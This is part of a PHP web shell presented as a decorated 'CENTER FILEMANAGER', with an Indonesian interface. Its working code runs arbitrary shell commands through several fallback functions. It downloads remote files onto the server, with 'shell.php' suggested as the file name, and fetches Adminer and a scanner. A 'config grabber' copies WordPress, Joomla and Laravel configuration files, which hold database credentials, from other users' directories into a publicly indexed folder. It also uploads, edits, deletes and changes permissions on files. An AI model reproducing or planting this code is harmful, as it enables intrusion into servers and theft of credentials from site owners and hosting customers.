    border-radius: 20px;
    cursor: pointer;
    width: 100%;
    font-family: inherit;
    margin-bottom: 10px;
}
.upload-container button {
    background: linear-gradient(135deg, var(--green), var(--green-dark));
    color: white;
    padding: 12px 30px;
    border-radius: 20px;
    cursor: pointer;
    border: none;
    font-weight: 600;
    font-family: inherit;
    box-shadow: 0 4px 12px rgba(107, 201, 142, 0.4);
    transition: all 0.3s;
    width: 100%;
}
.upload-container button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(107, 201, 142, 0.6); }

.sysinfo-panel {
    background: rgba(255, 255, 255, 0.9);
    border-radius: 25px;
    padding: 25px;
    margin: 20px auto;
    max-width: 900px;
    border: 3px dashed var(--purple);
}
.sysinfo-panel h3 {
    color: var(--purple);
    margin-bottom: 20px;
    font-size: 20px;
    border-bottom: 2px dashed #e6d4ff;
    padding-bottom: 12px;
}
.sysinfo-section { margin-bottom: 22px; }
.sysinfo-section h4 {
    color: var(--text);
    margin-bottom: 12px;
    font-size: 14px;
    font-weight: 600;
}
.sysinfo-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
    gap: 10px;
}
.sysinfo-item {
    background: rgba(255, 255, 255, 0.9);
    padding: 10px 15px;
    border-radius: 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 13px;
    border-left: 4px solid var(--purple);
    box-shadow: 0 2px 6px rgba(212, 184, 255, 0.2);
}
.sysinfo-item .label { color: var(--text-light); font-weight: 500; }
.sysinfo-item .value { font-weight: 600; }
.sysinfo-info-row {
    display: flex;
    justify-content: space-between;
    padding: 10px 15px;
    background: rgba(255, 255, 255, 0.9);
    border-radius: 15px;
    margin-bottom: 8px;
    font-size: 13px;
    border-left: 4px solid var(--blue);
}
.sysinfo-info-row .label { color: var(--text-light); font-weight: 500; }
.sysinfo-info-row .value {
    color: var(--text);
    font-weight: 600;
    word-break: break-all;
    text-align: right;
    max-width: 60%;
}

@media only screen and (max-width: 600px) {
    .title { font-size: 26px; }
    .header h1 { font-size: 20px; }
    .header h1 .emoji { font-size: 24px; }
    .action-buttons { width: 100%; }
    .form-container { max-width: 95%; padding: 20px; }
    .sysinfo-grid { grid-template-columns: 1fr; }
    .config-grabber textarea { width: 90%; }
    .file-item { padding: 10px 14px; }
    .tool-button { font-size: 12px; padding: 10px 15px; }
}
</style>
</head>
<body>
<div class="floating-bg fb1">🌸</div>
<div class="floating-bg fb2">✨</div>
<div class="floating-bg fb3">🎀</div>
<div class="floating-bg fb4">⭐</div>
<div class="floating-bg fb5">🌈</div>
<div class="floating-bg fb6">🍭</div>

<h1 class="title">🌸 CENTER FILEMANAGER 🌸</h1>

<div class="server-info">
    <p><span class="label-system">🐧 System:</span> <span class="value-info"><?php echo htmlspecialchars($serverInfo); ?></span></p>
    <p><span class="label-ip">🌐 IP:</span> <span class="value-info"><?php echo htmlspecialchars($serverIP); ?></span></p>
    <p><span class="label-php">🐘 PHP:</span> <span class="value-info"><?php echo htmlspecialchars($phpVersion); ?></span></p>
    <p><span class="label-dir">📁 Dir:</span>
    <?php
    $dirs = explode(DIRECTORY_SEPARATOR, $directory);
    $currentPath = '';
    foreach ($dirs as $index => $dir) {
        $currentPath .= $dir . DIRECTORY_SEPARATOR;
        echo '<a href="?dir=' . urlencode($currentPath) . '" class="value-info">' . $dir . '</a>';
        if ($index < count($dirs) - 1) echo ' / ';
    }
    ?>
    </p>
</div>

<div class="container-btn">
<div class="action-buttons">
<a href="?" class="action-button" title="Home">🏠</a>
<a href="?show_upload=1&dir=<?php echo urlencode($directory); ?>" class="action-button" title="Upload">📤</a>
<a href="?show_cmd=1&dir=<?php echo urlencode($directory); ?>" class="action-button" title="Terminal">💻</a>
<a href="?show_tools=1&dir=<?php echo urlencode($directory); ?>" class="action-button" title="Tools">🔧</a>
<a href="?new_file=1&dir=<?php echo urlencode($directory); ?>" class="action-button" title="New File">📝</a>
<a href="?create_folder=1&dir=<?php echo urlencode($directory); ?>" class="action-button" title="New Folder">📁</a>
<a href="?logout=1" class="action-button" title="Logout" style="background: linear-gradient(135deg, #ff4757, #ff6b9d);">🚪</a>
</div></div>

<?php if (isset($_GET['create_folder'])): ?>
 <div class="form-container">
    <form action="" method="POST">
        <div class="form-group">
            <label>📁 Nama Folder Baru</label>
            <input type="text" name="folder_name" required autofocus placeholder="misal: folder-baru">
        </div>
        <button type="submit" name="create_folder_btn" class="submit-button">✨ Buat Folder</button>
    </form>
 </div>
<?php endif; ?>

<?php
if (isset($_POST['create_folder_btn']) && isset($_POST['folder_name'])) {
    $newFolderName = $_POST['folder_name'];
    $newFolderPath = $directory . DIRECTORY_SEPARATOR . $newFolderName;
    if (!is_dir($newFolderPath)) {
        mkdir($newFolderPath, 0755);
        echo "<div class='success-notification'>🎉 Folder '$newFolderName' berhasil dibuat!</div>";
    } else {
        echo "<div class='error-notification'>😿 Folder '$newFolderName' sudah ada.</div>";
    }
}
?>

<?php if (isset($_GET['new_file'])): ?>
    <div class="form-container">
    <form action="" method="post">
        <div class="form-group">
            <label>📝 Nama File</label>
            <input type="text" name="file_name" required autofocus placeholder="misal: catatan.txt">
        </div>
        <div class="form-group">
            <label>✏️ Isi File</label>
            <textarea name="file_content" required placeholder="Tulis sesuatu..."></textarea>
        </div>
        <button type="submit" name="create_file" class="submit-button">💾 Simpan File</button>
    </form></div>
<?php endif; ?>

<?php
if (isset($_POST['create_file'])) {
    $fileName = $_POST['file_name'];
    $fileContent = $_POST['file_content'];
    if (empty($fileName)) {
        echo "<div class='error-notification'>😿 Nama file tidak boleh kosong.</div>";
    } else {
        $filePath = $directory . DIRECTORY_SEPARATOR . $fileName;
        if (file_put_contents($filePath, $fileContent)) {
            echo "<div class='success-notification'>🎉 File berhasil dibuat!</div>";
        } else {
            echo "<div class='error-notification'>😿 Gagal membuat file.</div>";
        }
    }
}
?>

<?php if ($tmpMsg): ?>
    <div class="success-notification"><?php echo $tmpMsg; ?></div>
<?php endif; ?>

<?php if (isset($_GET['adminer_downloaded'])): ?>
    <div class="success-notification">
        🎉 Adminer terunduh! <a href="/.cache/adminer.php" target="_blank">🡺 Buka Adminer</a>
    </div>
<?php elseif (isset($_GET['adminer_download_failed'])): ?>
    <div class="error-notification">😿 Gagal download Adminer.</div>
<?php endif; ?>

<?php if (isset($_GET['scanner_downloaded'])): ?>
    <div class="success-notification">
        🎉 Scanner terunduh! <a href="/.cache/scanner.php" target="_blank">🡺 Buka Scanner</a>
    </div>
<?php elseif (isset($_GET['scanner_failed'])): ?>
    <div class="error-notification">😿 Gagal download Scanner.</div>
<?php endif; ?>


<?php if ($showTools): ?>
    <div class="tool-buttons">
        <a href="?download_adminer=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-database"></i> Adminer
        </a>
        <a href="?download_scanner=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-shield-alt"></i> Scanner
        </a>
        <a href="?action=configx&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-cog"></i> Config
        </a>
        <a href="?show_finder=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-search"></i> Finder
        </a>
        <a href="?bypass_uploader=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-cloud-download-alt"></i> Bypass Uploader
        </a>
    </div>

    <div class="sysinfo-panel">
        <h3>⚙️ System Info</h3>

        <div class="sysinfo-section">
            <h4>🔧 Fungsi Eksekusi</h4>
            <div class="sysinfo-grid">
                <?php
                $execFuncs = array('shell_exec','exec','system','passthru','popen','proc_open','pcntl_exec');
                foreach ($execFuncs as $f):
                ?>
                    <div class="sysinfo-item">
                        <span class="label"><?php echo $f; ?></span>
                        <span class="value"><?php echo renderStatus($sysinfo['func_' . $f]); ?></span>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="sysinfo-section">
            <h4>🛠️ Compiler & Binary</h4>
            <div class="sysinfo-grid">
                <?php
                $bins = array('gcc','cc','g++','python','perl','curl','wget','nc','ncat','bash','sh');
                foreach ($bins as $b):
                ?>
                    <div class="sysinfo-item">
                        <span class="label"><?php echo $b; ?></span>
                        <span class="value"><?php echo renderStatus($sysinfo['bin_' . $b]); ?></span>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="sysinfo-section">
            <h4>📦 Ekstensi PHP</h4>
            <div class="sysinfo-grid">
                <?php
                $exts = array('curl','openssl','gd','mysqli','pdo','zip','mbstring','json','xml');
                foreach ($exts as $e):
                ?>
                    <div class="sysinfo-item">
                        <span class="label"><?php echo $e; ?></span>
                        <span class="value"><?php echo renderStatus($sysinfo['ext_' . $e]); ?></span>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="sysinfo-section">
            <h4>📊 Info Server</h4>
            <div class="sysinfo-info-row"><span class="label">PHP Version</span><span class="value"><?php echo htmlspecialchars($sysinfo['php_version']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">OS</span><span class="value"><?php echo htmlspecialchars($sysinfo['os']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">User</span><span class="value"><?php echo htmlspecialchars($sysinfo['user']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">Memory Limit</span><span class="value"><?php echo htmlspecialchars($sysinfo['memory_limit']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">Max Upload</span><span class="value"><?php echo htmlspecialchars($sysinfo['max_upload']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">Post Max Size</span><span class="value"><?php echo htmlspecialchars($sysinfo['post_max']); ?></span></div>
            <div class="sysinfo-info-row"><span class="label">Open Basedir</span><span class="value"><?php echo $sysinfo['open_basedir'] ? htmlspecialchars($sysinfo['open_basedir']) : '<span style="color:#52c77e">(tidak ada)</span>'; ?></span></div>
            <div class="sysinfo-info-row"><span class="label">Disable Functions</span><span class="value"><?php echo $sysinfo['disable_functions'] ? htmlspecialchars($sysinfo['disable_functions']) : '<span style="color:#52c77e">(tidak ada)</span>'; ?></span></div>
        </div>
    </div>
<?php endif; ?>


<?php
if (isset($_GET['bypass_uploader'])) {
    ?>
    <div class="form-container">
        <form action="" method="post">
            <div class="form-group">
                <label>🌐 URL File</label>
                <input type="url" name="file_url" required autofocus placeholder="https://...">
            </div>
            <div class="form-group">
                <label>📝 Nama File (dengan ekstensi)</label>
                <input type="text" name="file_name" required placeholder="misal: shell.php">
            </div>
            <button type="submit" name="download_file" class="submit-button">📥 Download & Simpan</button>
        </form>
    </div>
    <?php
}

if (isset($_POST['download_file'])) {
    $fileUrl = $_POST['file_url'];
    $fileName = $_POST['file_name'];
    $savePath = $directory . DIRECTORY_SEPARATOR . $fileName;

    if (filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        $fileContent = file_get_contents($fileUrl);
        if ($fileContent !== false) {
            if (file_put_contents($savePath, $fileContent)) {
                echo "<div class='success-notification'>🎉 File tersimpan: $fileName</div>";
            } else {
                echo "<div class='error-notification'>😿 Gagal menyimpan. Cek permission.</div>";
            }
        } else {
            echo "<div class='error-notification'>😿 Gagal mengunduh file.</div>";
        }
    } else {
        echo "<div class='error-notification'>😿 URL tidak valid.</div>";
    }
}
?>

<?php if ($showFinder): ?>
<div class="form-container">
    <form method="GET" action="">
        <div class="form-group">
            <label>📁 Direktori</label>
            <input type="text" name="dir" value="<?php echo htmlspecialchars($directory); ?>" required>
        </div>
        <div class="form-group">
            <label>🔍 Cari File/Folder</label>
            <input type="text" name="search" required autofocus placeholder="kata kunci...">
        </div>
        <button type="submit" class="submit-button">🔎 Cari</button>
    </form>
</div>
<?php endif; ?>

<?php if (!empty($searchResults)): ?>
    <div class="search-results">
    <h3>🔍 Hasil Pencarian (<?php echo count($searchResults); ?>)</h3>
    <ul>
        <?php foreach ($searchResults as $result): ?>
            <li>
                <a href="?dir=<?php echo urlencode(dirname($result)); ?>">
                    📄 <?php echo htmlspecialchars($result); ?>
                </a>
            </li>
        <?php endforeach; ?>
    </ul>
</div>
<?php endif; ?>


<?php
if (isset($_GET['action']) && $_GET['action'] == 'configx') {
    ?>
    <form action="" method="POST">
        <div class="config-grabber">
            <textarea name="usernames" readonly><?php echo implode("\n", $users); ?></textarea>
            <button type="submit" name="mek"><i class="fas fa-cog"></i> Croot</button>
        </div>
    </form>
    <?php
}

if (isset($_POST['mek'])) {
    $basePath = defined('__DIR__') ? __DIR__ : dirname(__FILE__);
    $configGrabberDir = $basePath . '/ConfigGrabber';

    if (!is_dir($configGrabberDir)) {
        mkdir($configGrabberDir, 0755);
        $htaccessContent = "Options +Indexes\nAllowOverride All\nOrder allow,deny\nAllow from all\n\n<Files .htaccess>\n    Order allow,deny\n    Deny from all\n</Files>\n";
        file_put_contents($configGrabberDir . '/.htaccess', $htaccessContent);
    }

    foreach ($configFiles as $file) {
        $pathParts = explode('/', $file);
        $user = isset($pathParts[2]) ? $pathParts[2] : 'unknown';
        $sub = isset($pathParts[4]) ? $pathParts[4] : 'root';
        $cms = '';
        if (strpos($file, 'wp-config.php') !== false) $cms = 'WordPress';
        elseif (strpos($file, 'configuration.php') !== false) $cms = 'Joomla';
        elseif (strpos($file, '.env') !== false) $cms = 'Laravel';
        elseif (strpos($file, 'config.db.php') !== false) $cms = 'Smarty';
        elseif (strpos($file, 'config.php') !== false) $cms = 'Codeigniter';

        if ($sub === 'root') $destinationFile = $configGrabberDir . DIRECTORY_SEPARATOR . "$user-$cms.txt";
        else $destinationFile = $configGrabberDir . DIRECTORY_SEPARATOR . "$user-$sub-$cms.txt";
        @copy($file, $destinationFile);
    }
    $configGrabberUrl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $configGrabberDir);
    $baseUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
    $folderLink = $baseUrl . $configGrabberUrl;

    echo "<div class='success-notification'>🎉 <a href='$folderLink' target='_blank'>>> ConfigGrabber</a></div>";
}
?>


<?php if ($showUpload): ?>
    <!-- Upload ke folder aktif -->
    <div class="upload-container">
        <h3 style="color:var(--green-dark);">📤 Upload ke Folder Aktif</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit" name="upload">📤 Upload</button>
        </form>
<?php
if (isset($_POST['upload']) && isset($_FILES['files'])) {
    $errors = array();
    $uploadedFiles = array();

    foreach ($_FILES['files']['tmp_name'] as $index => $tmpName) {
        $fileName = $_FILES['files']['name'][$index];
        $fileTmpName = $_FILES['files']['tmp_name'][$index];
        $fileError = $_FILES['files']['error'][$index];

        if ($fileError !== UPLOAD_ERR_OK) {
            $errors[] = "Error upload";
            continue;
        }

        $uploadPath = $directory . DIRECTORY_SEPARATOR . basename($fileName);
        if (move_uploaded_file($fileTmpName, $uploadPath)) {
            $uploadedFiles[] = $fileName;
        } else {
            $errors[] = "Gagal upload";
        }
    }

    if (!empty($errors)) echo "<div class='error-notification'>😿 " . implode(", ", $errors) . "</div>";
    if (!empty($uploadedFiles)) {
        echo "<div class='success-notification'>🎉 " . count($uploadedFiles) . " file berhasil diupload!</div>";
    }
}
?>
    </div>

    <!-- 🆕 Upload ke /tmp/ -->
    <div class="upload-container" style="margin-top:30px;border-top:3px dashed var(--yellow);padding-top:30px;">
        <h3 style="color:#ffb74d;">⚡ Upload ke /tmp/ (cepat)</h3>
        <p style="font-size:12px;color:#888;margin-bottom:15px;">File disimpan di <code style="background:#fff4b8;padding:3px 10px;border-radius:10px;font-weight:bold;">/tmp/</code> — berguna untuk file sementara</p>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="tmp_files[]" multiple>
            <button type="submit" name="upload_tmp" style="background:linear-gradient(135deg,#ffb74d,#ff9800);">⚡ Upload ke /tmp/</button>
        </form>
    </div>
<?php endif; ?>

<?php if ($showCmd): ?>
    <div class="terminal-container">
        <form method="post">
            <input type="text" name="command" placeholder="⌨️ ketik perintah..." class="command-input" autofocus>
            <button type="submit" class="command-button">▶️ Jalankan</button>
        </form>
        <?php
        $output = '';
        if (isset($_POST['command']) && $showCmd) {
            $command = escapeshellcmd($_POST['command']);
            $directoryCommand = "cd " . escapeshellarg($directory) . " && " . $command;

            if (function_exists('shell_exec')) {
                $output = shell_exec($directoryCommand);
            } elseif (function_exists('exec')) {
                $outputArray = array();
                exec($directoryCommand, $outputArray);
                $output = implode("\n", $outputArray);
            } elseif (function_exists('system')) {
                ob_start(); system($directoryCommand); $output = ob_get_clean();
            } elseif (function_exists('passthru')) {
                ob_start(); passthru($directoryCommand); $output = ob_get_clean();
            } elseif (function_exists('popen')) {
                $handle = popen($directoryCommand, 'r');
                if ($handle) {
                    while (!feof($handle)) $output .= fgets($handle);
                    pclose($handle);
                }
            } else {
                $output = "Fungsi eksekusi tidak tersedia.";
            }
        }
        ?>
        <?php if ($output): ?>
            <textarea class="output" readonly><?php echo htmlspecialchars($output); ?></textarea>
        <?php endif; ?>
    </div>
<?php endif; ?>


<?php
if (isset($_GET['action']) && isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = $directory . DIRECTORY_SEPARATOR . $file;

    if ($_GET['action'] === 'edit' && file_exists($filePath)) {
        $fileContent = file_get_contents($filePath); ?>
        <div class="form-container" style="max-width:800px;">
            <form method="POST">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label>✏️ Edit: <?php echo htmlspecialchars($file); ?></label>
                    <textarea name="content" style="height:400px;font-family:'Courier New',monospace;"><?php echo htmlspecialchars($fileContent); ?></textarea>
                </div>
                <button type="submit" class="submit-button">💾 Save</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'rename') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label>✏️ Nama Baru</label>
                    <input type="text" name="new_name" value="<?php echo htmlspecialchars($file); ?>" required>
                </div>
                <button type="submit" class="submit-button">🔀 Rename</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'delete') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <p style="text-align:center;margin-bottom:15px;">😱 Yakin hapus "<?php echo htmlspecialchars($file); ?>"?</p>
                <button type="submit" class="submit-button" style="background:linear-gradient(135deg,#ff4757,#ff6b9d);">🗑️ Hapus</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'chmod') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label>🔒 Permission (misal: 755)</label>
                    <input type="text" name="permissions" value="755" required>
                </div>
                <button type="submit" class="submit-button">🔧 Ubah</button>
            </form>
        </div>
    <?php }
} ?>


<ul class="file-list">
    <?php if (count($sortedFiles) > 0): ?>
        <?php foreach ($sortedFiles as $file): ?>
            <?php $filePath = $directory . DIRECTORY_SEPARATOR . $file; ?>
            <li class="file-item">
                <input type="radio" name="file_selection" id="file_<?php echo htmlspecialchars($file); ?>" value="<?php echo htmlspecialchars($file); ?>">
                <?php if (is_dir($filePath)): ?>
                    <a href="?dir=<?php echo urlencode($filePath); ?>" class="icon">
                        <i class="fas fa-folder folder-icon"></i>
                    </a>
                <?php else: ?>
                    <div class="icon">
                        <i class="fas fa-file-alt file-icon"></i>
                    </div>
                <?php endif; ?>
                <div class="file-name">
                    <?php if (is_dir($filePath)): ?>
                        <a href="?dir=<?php echo urlencode($filePath); ?>">
                            <?php echo htmlspecialchars($file); ?>/
                        </a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($file); ?>
                    <?php endif; ?>
                </div>
            </li>
        <?php endforeach; ?>
    <?php else: ?>
        <li class="file-item" style="justify-content:center;color:#aaa;">📂 Folder kosong</li>
    <?php endif; ?>
</ul>

<div class="select-options">
    <select id="actionSelect">
        <option value="">✨ Pilih Aksi</option>
        <option value="edit">✏️ Edit</option>
        <option value="rename">🔀 Rename</option>
        <option value="delete">🗑️ Delete</option>
        <option value="chmod">🔒 Chmod</option>
    </select>
    <button class="select-button" onclick="performAction()">▶️ Go</button>
</div>

<script>
    function performAction() {
        var selectedFile = document.querySelector('input[name="file_selection"]:checked');
        var action = document.getElementById('actionSelect').value;

        if (!selectedFile) { alert('😿 Pilih file dulu!'); return; }
        if (!action) { alert('😿 Pilih aksi dulu!'); return; }

        window.location.href = '?action=' + action + '&file=' + encodeURIComponent(selectedFile.value) + '&dir=' + encodeURIComponent('<?php echo $directory; ?>');
    }
</script>

</body>
</html>